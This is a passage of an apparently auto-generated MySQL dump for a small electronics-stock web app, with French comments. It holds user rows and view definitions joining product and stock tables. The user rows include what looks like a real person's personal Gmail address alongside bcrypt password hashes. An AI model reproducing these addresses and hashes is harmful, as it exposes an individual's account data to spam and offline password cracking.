(112, 'userSS', 'huser5@gmail.com', '$2y$10$8mAb76RS/hQOADv7GLrboeKZYpOZD3J.KxwQoLgYbrtYxAJDy3aLu', 3),
(113, 'Proatt', 'user5@gmail.com', '$2y$10$QQ9127vWSeeJfGbtd.rIW.gBje5oq9VmsHuwHhxuHJJjNXIz4msqq', 4),
(114, 'user5@gmail.com', 'kouakouezechielk06@gmail.com', '$2y$10$tuAQ7ztL/xYWppRGzseqHO1oRqYtALc8V6YqL2IgXnJqcpO5OBOvG', 4),
(115, 'user5@gmail.com', 'user@gmail.com', '$2y$10$UDBcwdNs.GdW0Zo3gadeEOo43zpWI6W1VQZ8V2tPXuyLmG/ICM4w6', 4),
(116, 'jeunehomme', 'bonjour@gmail.com', '$2y$10$HoqsRsJr8vThq2DKdlnGueglHf0XAYH4JeGyn9jcUT00hcnkajAp.', NULL),
(117, 'user5@gmail.com', 'kouakouezechielk06@gmail.com', '$2y$10$9DkNUiXqWrdE4xIAlYNlQuUG2LoqhV99XHtlx0fqOXAHI.ZbahPLm', NULL),
(118, 'eze1@gmail.com', 'kouakouezechielk06@gmail.com', '$2y$10$bdTStgew2aITVgxz.GjgxOOk.UuGUPXaohOIcS.ZxhnqVSmEIKOeu', NULL),
(119, 'kouakouezechielk06@gmail.com', 'kouakouezechielk06@gmail.com', '$2y$10$kquWaNYzQ4SIaT8zGgm1kOVeSSQt4c1Q2I7RF5zOIUqW4Dq7X9zpG', NULL),
(120, 'user5@gmail.com', 'kouakouezechielk06@gmail.com', '$2y$10$/2jfHcVgBpAA4Uv12GT14uZZeknG6UH6iwB2CT8KsqFSX0IHgT5zK', NULL),
(121, 'jeunefemme', 'zone@test.com', '$2y$10$yksioXhqVPxNaYnw8f/S6uA2TR7o32Kn3jXKIWbfKytOIssEeYUoS', NULL);

-- --------------------------------------------------------

--
-- Doublure de structure pour la vue `vue_stock_pc`
-- (Voir ci-dessous la vue réelle)
--
DROP VIEW IF EXISTS `vue_stock_pc`;
CREATE TABLE IF NOT EXISTS `vue_stock_pc` (
`id_produit` int
,`nom` text
,`description` text
,`prix` decimal(10,2)
,`quantite` int
,`id_stock` int
);

-- --------------------------------------------------------

--
-- Doublure de structure pour la vue `vue_stock_periph`
-- (Voir ci-dessous la vue réelle)
--
DROP VIEW IF EXISTS `vue_stock_periph`;
CREATE TABLE IF NOT EXISTS `vue_stock_periph` (
`id_produit` int
,`nom` text
,`description` text
,`prix` decimal(10,2)
,`quantite` int
,`id_stock` int
);

-- --------------------------------------------------------

--
-- Doublure de structure pour la vue `vue_stock_son`
-- (Voir ci-dessous la vue réelle)
--
DROP VIEW IF EXISTS `vue_stock_son`;
CREATE TABLE IF NOT EXISTS `vue_stock_son` (
`id_produit` int
,`nom` text
,`description` text
,`prix` decimal(10,2)
,`quantite` int
,`id_stock` int
);

-- --------------------------------------------------------

--
-- Doublure de structure pour la vue `vue_stock_tel`
-- (Voir ci-dessous la vue réelle)
--
DROP VIEW IF EXISTS `vue_stock_tel`;
CREATE TABLE IF NOT EXISTS `vue_stock_tel` (
`id_produit` int
,`nom` text
,`description` text
,`prix` decimal(10,2)
,`quantite` int
,`id_stock` int
);

-- --------------------------------------------------------

--
-- Doublure de structure pour la vue `vue_stock_tv`
-- (Voir ci-dessous la vue réelle)
--
DROP VIEW IF EXISTS `vue_stock_tv`;
CREATE TABLE IF NOT EXISTS `vue_stock_tv` (
`id_produit` int
,`nom` text
,`description` text
,`prix` decimal(10,2)
,`quantite` int
,`id_stock` int
);

-- --------------------------------------------------------

--
-- Structure de la vue `vue_stock_pc`
--
DROP TABLE IF EXISTS `vue_stock_pc`;

DROP VIEW IF EXISTS `vue_stock_pc`;
CREATE ALGORITHM=UNDEFINED DEFINER=`root`@`localhost` SQL SECURITY DEFINER VIEW `vue_stock_pc`  AS SELECT `p`.`id_produit` AS `id_produit`, `p`.`nom` AS `nom`, `p`.`description` AS `description`, `p`.`prix` AS `prix`, `s`.`quantite` AS `quantite`, `s`.`id_produit` AS `id_stock` FROM (`produit` `p` join `ecotechstock` `s` on((`p`.`id_produit` = `s`.`id_produit`))) ;

-- --------------------------------------------------------

--
-- Structure de la vue `vue_stock_periph`
--
DROP TABLE IF EXISTS `vue_stock_periph`;

DROP VIEW IF EXISTS `vue_stock_periph`;
CREATE ALGORITHM=UNDEFINED DEFINER=`root`@`localhost` SQL SECURITY DEFINER VIEW `vue_stock_periph`  AS SELECT `d`.`id_produit` AS `id_produit`, `d`.`nom` AS `nom`, `d`.`description` AS `description`, `d`.`prix` AS `prix`, `s`.`quantite` AS `quantite`, `s`.`id_stock` AS `id_stock` FROM (`ecotechperiphs` `d` join `ecotechstock_periphs` `s` on((`d`.`id_produit` = `s`.`id_produit`))) ;

-- --------------------------------------------------------

--
-- Structure de la vue `vue_stock_son`
--
DROP TABLE IF EXISTS `vue_stock_son`;

DROP VIEW IF EXISTS `vue_stock_son`;
CREATE ALGORITHM=UNDEFINED DEFINER=`root`@`localhost` SQL SECURITY DEFINER VIEW `vue_stock_son`  AS SELECT `d`.`id_produit` AS `id_produit`, `d`.`nom` AS `nom`, `d`.`description` AS `description`, `d`.`prix` AS `prix`, `s`.`quantite` AS `quantite`, `s`.`id_stock` AS `id_stock` FROM (`sons` `d` join `ecotechstock_sons` `s` on((`d`.`id_produit` = `s`.`id_produit`))) ;

-- --------------------------------------------------------

--
-- Structure de la vue `vue_stock_tel`
--
DROP TABLE IF EXISTS `vue_stock_tel`;

DROP VIEW IF EXISTS `vue_stock_tel`;
CREATE ALGORITHM=UNDEFINED DEFINER=`root`@`localhost` SQL SECURITY DEFINER VIEW `vue_stock_tel`  AS SELECT `d`.`id_produit` AS `id_produit`, `d`.`nom` AS `nom`, `d`.`description` AS `description`, `d`.`prix` AS `prix`, `s`.`quantite` AS `quantite`, `s`.`id_stock` AS `id_stock` FROM (`telephone` `d` join `ecotechstock_tel` `s` on((`d`.`id_produit` = `s`.`id_produit`))) ;

-- --------------------------------------------------------

--
-- Structure de la vue `vue_stock_tv`
--
DROP TABLE IF EXISTS `vue_stock_tv`;

DROP VIEW IF EXISTS `vue_stock_tv`;
CREATE ALGORITHM=UNDEFINED DEFINER=`root`@`localhost` SQL SECURITY DEFINER VIEW `vue_stock_tv`  AS SELECT `d`.`id_produit` AS `id_produit`, `d`.`nom` AS `nom`, `d`.`description` AS `description`, `d`.`prix` AS `prix`, `s`.`quantite` AS `quantite`, `s`.`id_stock` AS `id_stock` FROM (`televisions` `d` join `ecotechstock_tv` `s` on((`d`.`id_produit` = `s`.`id_produit`))) ;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
